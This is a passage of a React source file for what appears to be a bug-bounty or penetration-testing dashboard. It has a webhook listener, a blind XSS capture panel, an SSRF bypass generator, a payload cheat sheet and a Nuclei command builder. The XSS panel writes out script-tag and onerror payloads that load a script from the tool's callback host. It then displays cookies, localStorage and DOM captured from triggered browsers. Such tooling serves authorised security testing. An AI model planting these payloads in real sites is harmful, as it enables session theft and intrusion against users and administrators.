                  <h2 className={styles.emptyStateTitle}>Waiting for Incoming Requests</h2>
                  <p className={styles.emptyStateSubtitle}>
                    Send an HTTP request to your callback URL above or test with the commands below:
                  </p>
                </div>

                <div className={styles.demoBox}>
                  <span className={styles.demoTitle}>
                    <Terminal size={14} />
                    cURL (POST JSON)
                  </span>
                  <div className={styles.codeBlock}>
                    {`curl -X POST -H "Content-Type: application/json" \\
  -d '{"status": "test", "message": "Webhook received successfully"}' \\
  ${webhookUrl}`}
                    <button 
                      onClick={() => handleCopy(`curl -X POST -H "Content-Type: application/json" -d '{"status": "test", "message": "Webhook received successfully"}' ${webhookUrl}`, 'curl')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'curl' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                    </button>
                  </div>
                </div>

                <div className={styles.demoBox}>
                  <span className={styles.demoTitle}>
                    <Terminal size={14} />
                    PowerShell (GET)
                  </span>
                  <div className={styles.codeBlock}>
                    {`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?test=1"`}
                    <button 
                      onClick={() => handleCopy(`Invoke-RestMethod -Method Get -Uri "${webhookUrl}?test=1"`, 'powershell')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'powershell' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                    </button>
                  </div>
                </div>
              </div>
            ) : selectedRequest ? (
              <div className={`${styles.detailContent} animate-fade-in`}>
                
                {/* INGESTION META ROW */}
                <section className={styles.summaryGrid}>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>HTTP Method</span>
                    <span className={`${styles.methodPill} ${styles['method' + selectedRequest.method] || styles.methodOTHER}`} style={{ fontSize: '0.85rem', padding: '4px 10px' }}>
                      {selectedRequest.method}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Timestamp</span>
                    <span className={styles.summaryValue}>
                      {new Date(selectedRequest.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Client IP</span>
                    <span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>
                      {selectedRequest.ip}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Payload Size</span>
                    <span className={styles.summaryValue}>
                      {selectedRequest.size > 1024 ? `${(selectedRequest.size / 1024).toFixed(1)} KB` : `${selectedRequest.size} Bytes`}
                    </span>
                  </div>
                </section>

                {/* LOG DATA: HEADERS & PARAMS */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                  
                  {/* HEADERS CARD */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <Network size={15} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Headers ({Object.keys(selectedRequest.headers).length})</h3>
                    </div>
                    <div style={{ overflowX: 'auto' }}>
                      <table className={styles.headersTable}>
                        <tbody>
                          {Object.entries(selectedRequest.headers).map(([key, val]) => (
                            <tr key={key}>
                              <td className={styles.headerKey}>{key}</td>
                              <td className={styles.headerVal}>{val}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </section>

                  {/* QUERY PARAMETERS */}
                  {Object.keys(selectedRequest.query).length > 0 && (
                    <section className={styles.dataCard}>
                      <div className={styles.sectionHeader}>
                        <Globe size={15} style={{ color: 'var(--color-primary)' }} />
                        <h3 className={styles.sectionTitle}>Query Parameters ({Object.keys(selectedRequest.query).length})</h3>
                      </div>
                      <div style={{ overflowX: 'auto' }}>
                        <table className={styles.headersTable}>
                          <tbody>
                            {Object.entries(selectedRequest.query).map(([key, val]) => (
                              <tr key={key}>
                                <td className={styles.headerKey} style={{ color: 'var(--text-secondary)' }}>{key}</td>
                                <td className={styles.headerVal} style={{ fontFamily: 'monospace' }}>
                                  {Array.isArray(val) ? val.join(', ') : String(val)}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </section>
                  )}

                  {/* POST BODY CARD */}
                  {selectedRequest.body && (
                    <section className={styles.dataCard}>
                      <div className={styles.sectionHeader}>
                        <FileCode size={15} style={{ color: 'var(--color-primary)' }} />
                        <h3 className={styles.sectionTitle}>Request Body ({selectedRequest.bodyType.toUpperCase()})</h3>
                        <button 
                          onClick={() => handleCopy(selectedRequest.body, 'body')}
                          className={styles.copyBtn}
                          style={{ marginLeft: 'auto' }}
                        >
                          {copiedText === 'body' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                        </button>
                      </div>

                      {selectedRequest.bodyType === 'json' ? (
                        <pre className={styles.bodyPre}>
                          <code dangerouslySetInnerHTML={getHighlightedJson(selectedRequest.body)} />
                        </pre>
                      ) : (
                        <pre className={styles.bodyPre} style={{ color: 'var(--text-main)' }}>
                          <code>{selectedRequest.body}</code>
                        </pre>
                      )}
                    </section>
                  )}

                  {/* REQUEST REPLAY / FORWARDING CARD */}
                  <section className={styles.forwardSection}>
                    <div className={styles.sectionHeader} style={{ borderBottom: 'none', paddingBottom: '0' }}>
                      <Send size={15} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Replay / Forward Request</h3>
                    </div>
                    <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginTop: '4px' }}>
                      Forward this webhook payload to a local development endpoint (e.g. ngrok/localhost) or external server.
                    </p>
                    
                    <form onSubmit={handleForwardRequest} className={styles.forwardForm}>
                      <input 
                        type="url" 
                        required
                        placeholder="http://localhost:3000/webhook or https://api.example.com/webhook"
                        value={forwardTarget}
                        onChange={(e) => setForwardTarget(e.target.value)}
                        className={`input-field ${styles.forwardInput}`}
                      />
                      <button 
                        type="submit" 
                        disabled={forwardState === 'loading'}
                        className="btn-primary"
                        style={{ padding: '10px 18px', fontSize: '0.85rem' }}
                      >
                        {forwardState === 'loading' ? (
                          <>
                            <RefreshCw size={14} className="animate-spin" />
                            Forwarding...
                          </>
                        ) : (
                          <>
                            <Play size={14} fill="currentColor" />
                            Forward Request
                          </>
                        )}
                      </button>
                    </form>

                    {forwardState !== 'idle' && forwardResult && (
                      <div 
                        className="animate-fade-in"
                        style={{ 
                          marginTop: '16px', 
                          padding: '14px', 
                          borderRadius: 'var(--radius-sm)', 
                          border: '1px solid var(--border-light)',
                          background: 'var(--bg-canvas)' 
                        }}
                      >
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                          <span style={{ fontSize: '0.78rem', fontWeight: '600', color: 'var(--text-main)' }}>
                            Forward Result
                          </span>
                          <span className={`badge ${forwardState === 'success' ? 'badge-success' : 'badge-error'}`}>
                            {forwardState === 'success' ? `HTTP ${forwardResult.status}` : 'Forward Failed'}
                          </span>
                        </div>

                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '8px' }}>
                          <div>Latency: <strong style={{ color: 'var(--text-main)', fontFamily: 'monospace' }}>{forwardResult.durationMs} ms</strong></div>
                        </div>

                        {forwardResult.body && (
                          <div style={{ marginTop: '8px' }}>
                            <span style={{ fontSize: '0.7rem', fontWeight: '600', color: 'var(--text-secondary)' }}>Response Body:</span>
                            <pre 
                              style={{ 
                                marginTop: '4px',
                                padding: '10px', 
                                borderRadius: 'var(--radius-xs)', 
                                background: 'var(--bg-input)', 
                                fontSize: '0.75rem', 
                                fontFamily: 'monospace', 
                                color: 'var(--text-main)',
                                maxHeight: '150px',
                                overflowY: 'auto',
                                whiteSpace: 'pre-wrap',
                                wordBreak: 'break-all'
                              }}
                            >
                              {forwardResult.body}
                            </pre>
                          </div>
                        )}
                      </div>
                    )}
                  </section>
                </div>
              </div>
            ) : null}
          </>
        )}

        {/* --- MODULE 2: BLIND XSS HUNTER PANEL --- */}
        {activeTab === 'XSS' && (
          <>
            <header className={styles.panelHeader}>
              <div className={styles.urlContainer}>
                <div className={styles.urlWrapper}>
                  <span className={styles.urlLabel}>Blind XSS Script Tag</span>
                  <input 
                    type="text" 
                    readOnly 
                    value={`<script src="${xssPayloadUrl}"></script>`}
                    onClick={(e) => e.target.select()}
                    className={styles.urlInput}
                  />
                  <button 
                    onClick={() => handleCopy(`<script src="${xssPayloadUrl}"></script>`, 'xsstag')}
                    className={styles.copyBtn}
                    title="Copy XSS script tag"
                  >
                    {copiedText === 'xsstag' ? <Check size={16} style={{ color: 'var(--color-success)' }} /> : <Copy size={16} />}
                  </button>
                </div>

                <div className={styles.headerActions}>
                  <button 
                    onClick={() => setIsPollingActive(!isPollingActive)} 
                    className="btn-secondary"
                  >
                    <span className={isPollingActive ? styles.liveIndicator : styles.pausedIndicator} />
                    <span>{isPollingActive ? 'Live Polling' : 'Paused'}</span>
                  </button>

                  <button 
                    onClick={handleClearXssLogs}
                    disabled={xssTriggers.length === 0}
                    className="btn-secondary"
                    style={{ color: 'var(--color-error)' }}
                  >
                    <Trash2 size={14} />
                    <span>Clear Hits</span>
                  </button>
                </div>
              </div>
            </header>

            {xssTriggers.length === 0 ? (
              <div className={`${styles.emptyState} animate-fade-in`}>
                <div className={styles.emptyStateContent}>
                  <div className={styles.emptyIconBox}>
                    <ShieldAlert size={24} />
                  </div>
                  <h2 className={styles.emptyStateTitle}>Awaiting XSS Triggers</h2>
                  <p className={styles.emptyStateSubtitle}>
                    Inject the script tag or payloads below into target inputs or headers. When triggered by a browser or admin panel, environment details will appear here.
                  </p>
                </div>

                <div className={styles.demoBox}>
                  <span className={styles.demoTitle}>
                    <Terminal size={14} />
                    Payload Example 1: Standard Script Tag
                  </span>
                  <div className={styles.codeBlock}>
                    {`"><script src="${xssPayloadUrl}"></script>`}
                    <button 
                      onClick={() => handleCopy(`"><script src="${xssPayloadUrl}"></script>`, 'demo1')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'demo1' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                    </button>
                  </div>
                </div>

                <div className={styles.demoBox}>
                  <span className={styles.demoTitle}>
                    <Terminal size={14} />
                    Payload Example 2: Image Error Handler
                  </span>
                  <div className={styles.codeBlock}>
                    {`<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`}
                    <button 
                      onClick={() => handleCopy(`<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 'demo2')}
                      className={styles.demoCopyBtn}
                    >
                      {copiedText === 'demo2' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                    </button>
                  </div>
                </div>
              </div>
            ) : selectedXss ? (
              <div className={`${styles.detailContent} animate-fade-in`}>
                
                {/* TRIGGERED INFO PANEL */}
                <section className={styles.summaryGrid}>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Type</span>
                    <span className={`${styles.methodPill} ${styles.methodPOST}`} style={{ fontSize: '0.85rem', padding: '4px 10px' }}>
                      BLIND XSS
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Timestamp</span>
                    <span className={styles.summaryValue}>
                      {new Date(selectedXss.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Client IP</span>
                    <span className={styles.summaryValue} style={{ fontFamily: 'monospace' }}>
                      {selectedXss.ip}
                    </span>
                  </div>
                  <div className={styles.summaryCard}>
                    <span className={styles.summaryLabel}>Source URL</span>
                    <span className={styles.summaryValue} title={selectedXss.uri} style={{ textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
                      {selectedXss.uri}
                    </span>
                  </div>
                </section>

                {/* DETAILED EXFILTRATION RECORDS */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                  
                  {/* METADATA IDENTIFICATION */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <User size={15} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Client Environment</h3>
                    </div>
                    <table className={styles.headersTable}>
                      <tbody>
                        <tr>
                          <td className={styles.headerKey}>Page URL</td>
                          <td className={styles.headerVal} style={{ wordBreak: 'break-all' }}>{selectedXss.uri}</td>
                        </tr>
                        <tr>
                          <td className={styles.headerKey}>Referrer</td>
                          <td className={styles.headerVal} style={{ wordBreak: 'break-all' }}>{selectedXss.referrer || 'None'}</td>
                        </tr>
                        <tr>
                          <td className={styles.headerKey}>User-Agent</td>
                          <td className={styles.headerVal}>{selectedXss.userAgent}</td>
                        </tr>
                      </tbody>
                    </table>
                  </section>

                  {/* COOKIES (SENSITIVE) */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <Cpu size={15} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Captured Cookies</h3>
                      <button 
                        onClick={() => handleCopy(selectedXss.cookies, 'xsscookies')}
                        className={styles.copyBtn}
                        style={{ marginLeft: 'auto' }}
                      >
                        {copiedText === 'xsscookies' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>
                    <pre className={styles.bodyPre}>
                      <code>{selectedXss.cookies || 'None (No active cookies found or cookies are secured via HTTP-Only)'}</code>
                    </pre>
                  </section>

                  {/* LOCAL STORAGE */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <Database size={15} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>LocalStorage Data</h3>
                      <button 
                        onClick={() => handleCopy(selectedXss.localStorage, 'xsslocal')}
                        className={styles.copyBtn}
                        style={{ marginLeft: 'auto' }}
                      >
                        {copiedText === 'xsslocal' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>
                    <pre className={styles.bodyPre}>
                      <code dangerouslySetInnerHTML={getHighlightedJson(selectedXss.localStorage)} />
                    </pre>
                  </section>

                  {/* DOM HTML CODE VIEW */}
                  <section className={styles.dataCard}>
                    <div className={styles.sectionHeader}>
                      <FileCode size={15} style={{ color: 'var(--color-primary)' }} />
                      <h3 className={styles.sectionTitle}>Page DOM Structure (HTML)</h3>
                      <button 
                        onClick={() => handleCopy(selectedXss.dom, 'xssdom')}
                        className={styles.copyBtn}
                        style={{ marginLeft: 'auto' }}
                      >
                        {copiedText === 'xssdom' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>
                    <pre 
                      className={styles.bodyPre} 
                      style={{ 
                        maxHeight: '360px', 
                        overflowY: 'auto', 
                        fontFamily: 'monospace', 
                        fontSize: '0.75rem', 
                        whiteSpace: 'pre-wrap',
                        wordBreak: 'break-all'
                      }}
                    >
                      <code>{selectedXss.dom}</code>
                    </pre>
                  </section>

                </div>
              </div>
            ) : null}
          </>
        )}

        {/* --- MODULE 3: STEALTH SSRF BYPASS GENERATOR --- */}
        {activeTab === 'SSRF' && (
          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '24px 32px' }}>
            
            {/* Input target control */}
            <div 
              style={{ 
                padding: '20px', 
                background: 'var(--bg-surface)', 
                borderRadius: 'var(--radius-md)', 
                border: '1px solid var(--border-light)', 
                marginBottom: '24px'
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                <Zap size={16} style={{ color: 'var(--color-primary)' }} />
                <h2 style={{ fontSize: '1.05rem', fontWeight: '700', color: 'var(--text-main)' }}>SSRF URL Encoders & Bypasses</h2>
              </div>
              <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '16px', maxWidth: '640px', lineHeight: '1.5' }}>
                Test how target systems and backend HTTP clients parse alternative IP address encodings and redirect patterns to evaluate filter robustness.
              </p>
              
              <div style={{ display: 'flex', gap: '10px' }}>
                <input 
                  type="text" 
                  value={ssrfTarget}
                  onChange={(e) => setSsrfTarget(e.target.value)}
                  placeholder="e.g. 127.0.0.1 or localhost"
                  className="input-field"
                  style={{ flex: 1, padding: '10px 14px', fontSize: '0.85rem', fontFamily: 'monospace' }}
                />
                <button 
                  onClick={() => setSsrfTarget('127.0.0.1')}
                  className="btn-secondary"
                  style={{ padding: '0 16px', fontSize: '0.8rem' }}
                >
                  Reset Loopback
                </button>
              </div>
            </div>

            {/* Generated results cards */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-secondary)', textTransform: 'uppercase', letterSpacing: '0.04em' }}>
                Generated Encodings ({ssrfBypasses.length})
              </span>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '12px' }}>
                {ssrfBypasses.map((bypass, idx) => (
                  <div 
                    key={idx} 
                    style={{ 
                      padding: '16px', 
                      background: 'var(--bg-surface)', 
                      borderRadius: 'var(--radius-sm)', 
                      border: '1px solid var(--border-light)', 
                      display: 'flex', 
                      flexDirection: 'column', 
                      gap: '10px'
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.72rem', fontWeight: '700', color: 'var(--color-primary)', textTransform: 'uppercase', letterSpacing: '0.03em' }}>
                        {bypass.category}
                      </span>
                      <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>
                        #{idx + 1}
                      </span>
                    </div>

                    <div 
                      style={{ 
                        display: 'flex', 
                        alignItems: 'center', 
                        background: 'var(--bg-input)', 
                        border: '1px solid var(--border-light)', 
                        borderRadius: 'var(--radius-xs)', 
                        padding: '10px 14px',
                        gap: '10px' 
                      }}
                    >
                      <span 
                        style={{ 
                          color: 'var(--text-main)', 
                          fontFamily: 'monospace', 
                          fontSize: '0.85rem', 
                          fontWeight: '600', 
                          flex: 1, 
                          whiteSpace: 'nowrap', 
                          overflowX: 'auto',
                          paddingBottom: '2px'
                        }}
                      >
                        {bypass.payload}
                      </span>
                      <button 
                        onClick={() => handleCopy(bypass.payload, `ssrf-${idx}`)}
                        className={styles.copyBtn}
                        style={{ flexShrink: '0' }}
                      >
                        {copiedText === `ssrf-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                      </button>
                    </div>

                    <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', lineHeight: '1.45', margin: 0 }}>
                      {bypass.desc}
                    </p>
                  </div>
                ))}
              </div>
            </div>

          </div>
        )}

        {/* --- MODULE 4: TACTICAL PAYLOADS CHEAT SHEET --- */}
        {activeTab === 'PAYLOADS' && (
          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '24px 32px' }}>
            
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
              <BookOpen size={16} style={{ color: 'var(--color-primary)' }} />
              <h2 style={{ fontSize: '1.05rem', fontWeight: '700', color: 'var(--text-main)' }}>Payload Cheat Sheet</h2>
            </div>
            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '24px', maxWidth: '640px', lineHeight: '1.5' }}>
              Reference library of injection payloads configured with your active session listener and XSS callback URLs.
            </p>

            {/* List categories dynamically */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
              {filteredPayloads.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>
                  <HelpCircle size={28} style={{ margin: '0 auto 8px', color: 'var(--text-muted)' }} />
                  <p>No payloads match your current filter criteria.</p>
                </div>
              ) : (
                filteredPayloads.map(cat => (
                  <section key={cat.category} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '6px' }}>
                      <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: 'var(--color-primary)' }}></span>
                      <h3 style={{ fontSize: '0.85rem', fontWeight: '700', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.03em' }}>
                        {cat.title}
                      </h3>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                      {cat.items.map((item, idx) => (
                        <div 
                          key={idx}
                          style={{
                            padding: '16px',
                            background: 'var(--bg-surface)',
                            border: '1px solid var(--border-light)',
                            borderRadius: 'var(--radius-sm)',
                            display: 'flex',
                            flexDirection: 'column',
                            gap: '10px'
                          }}
                        >
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                              <h4 style={{ fontSize: '0.82rem', fontWeight: '600', color: 'var(--text-main)', margin: 0 }}>
                                {item.title}
                              </h4>
                              
                              {/* Tech Stack Badge */}
                              {item.tech && (
                                <span className="badge badge-neutral">
                                  {item.tech}
                                </span>
                              )}

                              {/* Priority Badge */}
                              {item.priority === 'HIGH' ? (
                                <span className="badge badge-error">
                                  {item.era || 'High Priority'}
                                </span>
                              ) : item.priority === 'MEDIUM' ? (
                                <span className="badge badge-warning">
                                  {item.era || 'Medium'}
                                </span>
                              ) : (
                                <span className="badge badge-neutral">
                                  {item.era || 'Standard'}
                                </span>
                              )}
                            </div>
                            
                            <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                              {cat.category}-00{idx + 1}
                            </span>
                          </div>

                          <div 
                            style={{ 
                              display: 'flex', 
                              alignItems: 'center', 
                              background: 'var(--bg-input)', 
                              border: '1px solid var(--border-light)', 
                              borderRadius: 'var(--radius-xs)', 
                              padding: '10px 14px',
                              gap: '10px' 
                            }}
                          >
                            <span 
                              style={{ 
                                color: 'var(--text-main)', 
                                fontFamily: 'monospace', 
                                fontSize: '0.82rem', 
                                flex: 1, 
                                whiteSpace: 'nowrap', 
                                overflowX: 'auto',
                                paddingBottom: '2px'
                              }}
                            >
                              {item.code}
                            </span>
                            <button 
                              onClick={() => handleCopy(item.code, `${cat.category}-${idx}`)}
                              className={styles.copyBtn}
                              style={{ flexShrink: '0' }}
                            >
                              {copiedText === `${cat.category}-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
                            </button>
                          </div>

                          <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', lineHeight: '1.45', margin: 0 }}>
                            {item.desc}
                          </p>
                        </div>
                      ))}
                    </div>
                  </section>
                ))
              )}
            </div>

          </div>
        )}

        {/* --- MODULE 5: PROJECTDISCOVERY NUCLEI INTEGRATION & OOB SUITE --- */}
        {activeTab === 'NUCLEI' && (
          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '24px 32px' }}>
            
            {/* Header Title & Badges */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', marginBottom: '20px' }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
                  <Cpu size={18} style={{ color: 'var(--color-primary)' }} />
                  <h2 style={{ fontSize: '1.15rem', fontWeight: '700', color: 'var(--text-main)' }}>
                    Nuclei Automation & OOB Suite
                  </h2>
                </div>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', maxWidth: '680px', lineHeight: '1.5' }}>
                  Generate ProjectDiscovery Nuclei scanning templates configured for your active callback endpoint. Supports Out-of-Band SSRF, Blind XSS header fuzzing, and real-time webhook finding ingestion.
                </p>
              </div>

              {/* Status Badges */}
              <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                <span className="badge badge-success">
                  Nuclei v3.x Compatible
                </span>
                <span className="badge badge-info">
                  110,000+ Local Templates
                </span>
              </div>
            </div>

            {/* Quick Navigation Filter Pills */}
            <div style={{ display: 'flex', gap: '8px', overflowX: 'auto', paddingBottom: '8px', marginBottom: '20px' }}>
              {[
                { id: 'ALL', label: 'All Sections' },
                { id: 'BUILDER', label: 'Command Builder' },
                { id: 'OOB_SSRF', label: 'SSRF / RCE Template' },
                { id: 'BLIND_XSS', label: 'Blind XSS Fuzzer' },
                { id: 'REPORTING', label: 'Live Webhook Export' },
                { id: 'COMMUNITY', label: 'Template Presets' },
                { id: 'CHEATSHEET', label: 'CLI Flags' }
              ].map(sec => (
                <button
                  key={sec.id}
                  onClick={() => setSelectedNucleiSection(sec.id)}
                  style={{
                    padding: '6px 12px',
                    borderRadius: 'var(--radius-sm)',
                    fontSize: '0.75rem',
                    fontWeight: '600',
                    cursor: 'pointer',
                    whiteSpace: 'nowrap',
                    border: selectedNucleiSection === sec.id ? '1px solid var(--color-primary)' : '1px solid var(--border-light)',
                    background: selectedNucleiSection === sec.id ? 'var(--color-primary-dim)' : 'var(--bg-surface)',
                    color: selectedNucleiSection === sec.id ? 'var(--color-primary)' : 'var(--text-secondary)',
                    transition: 'all 0.15s ease'
                  }}
                >
                  {sec.label}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>

              {/* 1. INTERACTIVE NUCLEI COMMAND BUILDER */}
              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'BUILDER') && (
                <div 
                  style={{ 
                    padding: '20px', 
                    background: 'var(--bg-surface)', 
                    borderRadius: 'var(--radius-md)', 
                    border: '1px solid var(--border-light)',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '16px'
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <Terminal size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 style={{ fontSize: '0.92rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                        Command Generator
                      </h3>
                    </div>
                    <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                      Endpoint: {id}
                    </span>
                  </div>

                  {/* Builder Form Grid */}
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '12px' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                        Target URL or File
                      </label>
                      <input 
                        type="text"
                        value={builderTarget}
                        onChange={(e) => setBuilderTarget(e.target.value)}
                        placeholder="https://example.com or targets.txt"
                        className={styles.inputField}
                        style={{ padding: '8px 12px', fontSize: '0.82rem', fontFamily: 'monospace' }}
                      />
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                        Template Strategy
                      </label>
                      <select
                        value={builderTemplateType}
                        onChange={(e) => setBuilderTemplateType(e.target.value)}
                        className={styles.selectField}
                        style={{ padding: '8px 12px', fontSize: '0.82rem' }}
                      >
                        <option value="OOB_SSRF">Out-of-Band SSRF Callback Template</option>
                        <option value="BLIND_XSS">Blind XSS Header Fuzzer Template</option>
                        <option value="ALL_CUSTOM">All Local Templates (C:\templates\)</option>
                        <option value="WORDFENCE">WordPress Wordfence CVEs</option>
                        <option value="OFFICIAL_CVES">Official ProjectDiscovery CVEs (-t cves/)</option>
                        <option value="FUZZING">PD Fuzzing Templates</option>
                      </select>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                        Severity Filter
                      </label>
                      <select
                        value={builderSeverity}
                        onChange={(e) => setBuilderSeverity(e.target.value)}
                        className={styles.selectField}
                        style={{ padding: '8px 12px', fontSize: '0.82rem' }}
                      >
                        <option value="critical,high">Critical & High Only</option>
                        <option value="critical">Critical Only</option>
                        <option value="critical,high,medium">Critical, High, Medium</option>
                        <option value="all">All Severities</option>
                      </select>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                      <label style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)' }}>
                        Rate Limit (req/sec)
                      </label>
                      <input 
                        type="number"
                        value={builderRateLimit}
                        onChange={(e) => setBuilderRateLimit(e.target.value)}
                        placeholder="50"
                        className={styles.inputField}
                        style={{ padding: '8px 12px', fontSize: '0.82rem' }}
                      />
                    </div>
                  </div>

                  {/* Generated Output Command */}
                  {(() => {
                    const isTargetFile = builderTarget.endsWith('.txt');
                    const targetFlag = isTargetFile ? `-l ${builderTarget}` : `-u ${builderTarget}`;
                    let templateFlag = '';
                    if (builderTemplateType === 'OOB_SSRF') templateFlag = `-t ssrf-oob.yaml -var callback=${webhookUrl}`;
                    else if (builderTemplateType === 'BLIND_XSS') templateFlag = `-t blind-xss.yaml -var xss_url=${xssPayloadUrl}`;
                    else if (builderTemplateType === 'ALL_CUSTOM') templateFlag = `-t C:\\templates\\`;
                    else if (builderTemplateType === 'WORDFENCE') templateFlag = `-t C:\\templates\\topscoder_nuclei-wordfence-cve\\`;
                    else if (builderTemplateType === 'OFFICIAL_CVES') templateFlag = `-t cves/`;
                    else if (builderTemplateType === 'FUZZING') templateFlag = `-t C:\\templates\\projectdiscovery_fuzzing-templates\\`;

                    const sevFlag = builderSeverity !== 'all' ? `-s ${builderSeverity}` : '';
                    const rlFlag = builderRateLimit ? `-rl ${builderRateLimit} -c ${Math.max(1, Math.floor(builderRateLimit / 2))}` : '';
                    const generatedCmd = `nuclei ${targetFlag} ${templateFlag} ${sevFlag} ${rlFlag}`.replace(/\s+/g, ' ').trim();

                    return (
                      <div 
                        style={{ 
                          display: 'flex', 
                          alignItems: 'center', 
                          background: 'var(--bg-input)', 
                          border: '1px solid var(--border-light)', 
                          borderRadius: 'var(--radius-xs)', 
